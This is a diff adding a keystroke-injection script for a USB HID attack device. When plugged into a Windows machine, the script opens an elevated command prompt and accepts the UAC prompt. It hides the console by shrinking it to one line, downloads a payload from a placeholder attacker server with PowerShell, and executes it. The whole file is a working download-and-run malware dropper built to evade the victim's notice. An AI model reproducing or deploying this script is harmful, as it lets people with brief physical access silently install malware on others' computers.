@@ -1,0 +1,33 @@
+DELAY 5000
+CONTROL ESCAPE
+DELAY 300
+STRING CMD
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING color FE
+ENTER
+DELAY 300
+STRING mode con cols=14 lines=1
+ENTER
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 500
+STRING $client = new-object System.Net.WebClient
+ENTER
+DELAY 500
+STRING $client.DownloadFile("http://*ip_du_server*/*payload*","C:\*adresse_du_payload*\*payload*")
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 100
+STRING start C:\*adresse_du_payload*\*payload*  
+ENTER
+DELAY 500
+STRING exit
+ENTER
+STRING exit
+ENTER
